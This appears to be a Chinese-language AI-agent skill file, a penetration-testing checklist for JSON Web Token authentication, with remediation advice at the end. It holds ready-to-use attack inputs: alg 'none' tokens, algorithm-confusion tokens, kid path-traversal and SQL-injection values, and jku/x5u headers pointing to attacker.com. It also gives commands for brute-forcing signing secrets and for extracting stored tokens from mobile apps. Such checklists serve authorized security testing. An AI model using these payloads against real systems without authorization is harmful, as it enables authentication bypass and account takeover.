---
name: claude-red-jwt
description: JSON Web Token攻击方法论清单。覆盖algorithm confusion（none/RS256→HS256）、weak secret暴力破解、kid注入、jku/x5u头注入、JWT头注入、过期token接受。当用户需要测试JWT认证或通过JWT操纵发现认证绕过时触发。
---

# JSON Web Token（JWT）安全测试方法论

## 快捷流程
1. 添加/删除/修改claims
2. 尝试将algorithm设为 `none` 或在RSA和HMAC间切换
3. 暴力破解弱签名密钥
4. 通过XXE或SSRF泄露密钥
5. 注入header（kid、jku、jwk、x5u）

## 漏洞类型

### Algorithm None
某些库在错误配置时仍允许禁用签名验证（`alg:"none"`）。

### Algorithm Confusion
服务器错误地将RSA公钥当作HMAC密钥使用，攻击者可通过切换算法签名token。
```python
{"alg":"HS256","typ":"JWT","kid":"expected-key"}.payload.<用RSA公钥作为HMAC密钥重新签名>
```

### 弱密钥
可暴力破解的HMAC密钥。

### 缺少签名验证
根本不验证签名。

### Key ID（kid）注入
利用 `kid` 参数加载错误密钥或注入文件/SQL路径：
```json
{"alg":"HS256","kid":"../../../../dev/null"}
{"alg":"HS256","kid":"' OR 1=1 --"}
```

### JWK/JKU注入
```json
{"alg":"RS256","jwk":{"kty":"RSA","e":"AQAB","kid":"attacker-key","n":"..."}}
{"alg":"RS256","jku":"https://attacker.com/jwks.json"}
```

### x5u滥用
从不安全的URL加载X.509密钥。

### JWKS缓存投毒
通过 `kid` 碰撞或响应头技巧强制缓存接受攻击者密钥。

## JWT混淆攻击

### SAML-JWT混淆
应用同时接受SAML断言和JWT：
- 发送JWT绕过SAML签名验证
- 或反过来——发送SAML到预期JWT的位置

### API Key-JWT混淆
```bash
# 在预期JWT的地方尝试API key
curl -H "Authorization: Bearer <api_key>" https://api.target/resource
```

### Session Cookie-JWT混合
应用接受session cookie或JWT：
- 测试session验证是否更弱
- 是否可以将JWT claims注入session cookie

## 移动应用JWT存储

### Android
```bash
# 检查SharedPreferences
adb shell "run-as com.target.app cat /data/data/com.target.app/shared_prefs/auth.xml"
```

### iOS
```bash
# Keychain提取
idevicebackup2 backup --full /path/to/backup
```

### React Native
```javascript
// AsyncStorage存储在明文
// Android: SQLite DB, iOS: plist files
```

## 测试步骤

### 1. 解码检查
```
base64url_decode(header).base64url_decode(payload).signature
```

### 2. 测试 "none" Algorithm
```json
{"alg":"none","typ":"JWT"}.payload.""
{"alg":"None","typ":"JWT"}.payload.""
{"alg":"nOnE","typ":"JWT"}.payload."
```

### 3. Algorithm Confusion
```json
{"alg":"HS256","typ":"JWT","kid":"expected-key"}.payload.<用公钥作为HMAC密钥重新签名>
```

### 4. Kid参数攻击
```json
{"alg":"HS256","kid":"../../../../dev/null"}
{"alg":"HS256","kid":"file:///dev/null"}
{"alg":"HS256","kid":"' OR 1=1 --"}
```

### 5. JWK/JKU注入
```json
{"alg":"RS256","jwk":{"kty":"RSA","e":"AQAB","kid":"attacker-key","n":"..."}}
{"alg":"RS256","jku":"https://attacker.com/jwks.json"}
{"alg":"RS256","x5u":"https://attacker.com/cert.pem"}
```

### 6. 暴力破解HMAC密钥
```bash
python3 jwt_tool.py <token> -C -d wordlist.txt
```

## 工具

- **jwt.io**：基本token检查
- **JWT_Tool**：`python3 jwt_tool.py <token> -M all`
- **jwtXploiter**：高级JWT漏洞扫描
- **jwt_killer**：多攻击向量自动测试
- **c-jwt-cracker**：C实现的HMAC高速暴力破解
- **Burp Suite**：JWT Editor extension、Autorize、Auth Analyzer

## 修复建议

- 使用短生命周期access token，频繁轮换refresh token
- 始终验证 `aud`（audience）和 `iss`（issuer）claims
- 验证密钥材料与algorithm匹配；拒绝不匹配
- 拒绝包含未知 `crit` header参数的token
- 维护服务器端deny-list（按 `jti`）
- DPoP token：验证HTTP请求绑定；强制一次性使用nonce
- JWKS验证：TLS pinned验证；禁用远程 `jku`/`x5u`（信任域除外）；缓存密钥，短TTL，验证 `kid` 唯一性
- 禁用 `none` 并防止algorithm降级
- 优先 `SameSite=Lax/Strict` HttpOnly cookies用于web
- 首选 `PASETO`（完全移除algorithm协商）或 `Macaroons`
